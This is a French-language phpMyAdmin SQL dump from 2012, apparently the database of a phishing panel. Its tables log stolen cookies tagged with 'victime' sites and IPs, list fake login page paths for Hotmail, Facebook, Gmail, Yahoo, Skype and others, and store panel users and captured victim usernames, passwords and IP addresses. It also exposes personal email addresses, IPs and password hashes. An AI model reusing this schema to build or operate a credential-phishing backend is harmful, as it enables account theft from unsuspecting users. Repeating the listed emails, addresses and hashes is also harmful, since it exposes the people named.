-- phpMyAdmin SQL Dump
-- version 3.4.5
-- http://www.phpmyadmin.net
--
-- Client: localhost
-- Généré le : Mar 10 Juillet 2012 à 09:50
-- Version du serveur: 5.0.62
-- Version de PHP: 5.2.14

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Base de données: `lala1_a`
--

-- --------------------------------------------------------

--
-- Structure de la table `ana4is_coockies`
--

CREATE TABLE IF NOT EXISTS `ana4is_coockies` (
  `coockie_id` int(11) NOT NULL auto_increment,
  `user_id_coockie` int(11) NOT NULL,
  `coockie_data` text NOT NULL,
  `sit_url_victime` varchar(255) NOT NULL,
  `ip_coockies` varchar(255) NOT NULL,
  `date_coockie` int(11) NOT NULL,
  `coockie_deleted` int(11) NOT NULL,
  PRIMARY KEY  (`coockie_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- Contenu de la table `ana4is_coockies`
--

INSERT INTO `ana4is_coockies` (`coockie_id`, `user_id_coockie`, `coockie_data`, `sit_url_victime`, `ip_coockies`, `date_coockie`, `coockie_deleted`) VALUES
(1, 782, 'Tm8gY29vY2tpZXM=', 'gayporn.fr', '91.178.206.35', 1315167587, 0),
(2, 782, 'Tm8gY29vY2tpZXM=', 'gayporn.fr', '91.178.206.35', 1315167658, 0),
(3, 0, 'Tm8gY29vY2tpZXM=', '', '127.0.0.1', 1341247132, 0),
(4, 0, 'Tm8gY29vY2tpZXM=', '', '127.0.0.1', 1341305182, 0),
(5, 0, 'Tm8gY29vY2tpZXM=', '', '127.0.0.1', 1341305187, 0);

-- --------------------------------------------------------

--
-- Structure de la table `ana4is_scamas`
--

CREATE TABLE IF NOT EXISTS `ana4is_scamas` (
  `scama_id` int(11) unsigned NOT NULL auto_increment,
  `scama_desc` varchar(255) NOT NULL,
  `scama_url` varchar(255) NOT NULL,
  `scama_url1` varchar(255) NOT NULL,
  `scama_url2` varchar(255) NOT NULL,
  `scama_url3` varchar(255) NOT NULL,
  `scama_photo` varchar(255) NOT NULL,
  `scama_dir` varchar(255) NOT NULL,
  PRIMARY KEY  (`scama_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=64 ;

--
-- Contenu de la table `ana4is_scamas`
--

INSERT INTO `ana4is_scamas` (`scama_id`, `scama_desc`, `scama_url`, `scama_url1`, `scama_url2`, `scama_url3`, `scama_photo`, `scama_dir`) VALUES
(1, 'Hotmail', 'chat/login.live.com/?i=', '', '', '', 'Logo/hotmail.bmp', 'Hotmail'),
(2, 'Facebook', 'chat/facebook.com/?i=', '', '', '', 'Logo/facebook.png', 'Facebook'),
(3, 'Yahoo', 'chat/login.yahoo.com/?i=', '', '', '', 'Logo/base.png', 'Yahoo'),
(4, 'Skype', 'chat/skype.com/?i=', '', '', '', 'Logo/skype.png', 'Skype'),
(5, 'Gmail', 'chat/gmail.com/?i=', '', '', '', 'Logo/gmail.png', 'Gmail'),
(7, 'Rapidshare', 'chat/rapidshare.com/login/?i=', '', '', '', 'Logo/Rapidsha.png', 'Rapidshare'),
(6, 'Skyrock', 'chat/skyrock.com/?connect=', '', '', '', 'Logo/rock.PNG', 'Skyrock');

-- --------------------------------------------------------

--
-- Structure de la table `ana4is_users`
--

CREATE TABLE IF NOT EXISTS `ana4is_users` (
  `user_id` int(11) unsigned NOT NULL auto_increment,
  `user_name` varchar(255) NOT NULL,
  `user_password` varchar(255) NOT NULL,
  `user_email` varchar(255) NOT NULL,
  `user_contry` varchar(255) NOT NULL,
  `user_date_register` int(11) NOT NULL,
  `user_age` int(11) NOT NULL,
  `user_level` int(11) NOT NULL default '1',
  PRIMARY KEY  (`user_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- Contenu de la table `ana4is_users`
--

INSERT INTO `ana4is_users` (`user_id`, `user_name`, `user_password`, `user_email`, `user_contry`, `user_date_register`, `user_age`, `user_level`) VALUES
(1, 'admin', '4a30ebaf3fe1be4fee3338fd0356fd0f', 'hakim44444@hotmail.com', 'dz', 1325620560, 16, 2),
(3, 'kaka', '4a30ebaf3fe1be4fee3338fd0356fd0f', 'aimadmoussaoui2@gmail.com', 'Country...', 1341253337, 15, 1);

-- --------------------------------------------------------

--
-- Structure de la table `ana4is_victims`
--

CREATE TABLE IF NOT EXISTS `ana4is_victims` (
  `victime_id` int(11) unsigned NOT NULL auto_increment,
  `victime_user` varchar(255) NOT NULL,
  `victime_password` varchar(255) NOT NULL,
  `victime_date` int(11) NOT NULL,
  `victime_ip` varchar(255) NOT NULL,
  `victime_user_id` int(11) NOT NULL,
  `victime_scama` int(11) NOT NULL,
  `victime_is_new` int(11) NOT NULL default '1',
  `victime_deleted` int(11) NOT NULL default '0',
  PRIMARY KEY  (`victime_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Contenu de la table `ana4is_victims`
--

INSERT INTO `ana4is_victims` (`victime_id`, `victime_user`, `victime_password`, `victime_date`, `victime_ip`, `victime_user_id`, `victime_scama`, `victime_is_new`, `victime_deleted`) VALUES
(1, 'hakim44444@hotmail.com', 'g', 1341906536, '41.108.2.33', 1, 2, 1, 0),
(2, 'hakim44444@hotmail.com', 'j', 1341906549, '41.108.2.33', 1, 1, 1, 0),
(3, 'm', 'o', 1341906557, '41.108.2.33', 1, 4, 1, 0);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
